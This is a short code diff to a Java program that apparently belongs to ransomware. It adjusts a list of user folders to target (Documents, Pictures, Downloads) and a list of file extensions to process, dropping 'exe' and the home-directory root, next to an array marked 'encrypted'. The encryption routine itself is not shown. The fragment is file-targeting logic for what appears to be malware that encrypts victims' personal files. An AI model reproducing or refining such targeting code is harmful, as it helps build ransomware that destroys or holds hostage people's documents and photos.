@@ -63,13 +63,12 @@ public class Main {
         CriticalPathList.add(System.getProperty("user.home") + "/Documents");
         CriticalPathList.add(System.getProperty("user.home") + "/Pictures");
         CriticalPathList.add(System.getProperty("user.home") + "/Downloads");
-        CriticalPathList.add(System.getProperty("user.home"));
 
         for (String TargetDirectory:CriticalPathList) {
             File root = new File(TargetDirectory);
 
             try {
-                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jfif", "doc", "rtf", "wpd", "html", "xlsx", "csv", "exe", "dll"};
+                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jfif", "doc", "rtf", "wpd", "html", "xlsx", "csv", "dll"};
                 String[] decrypted = {"encrypted"};
 
                 Collection files;
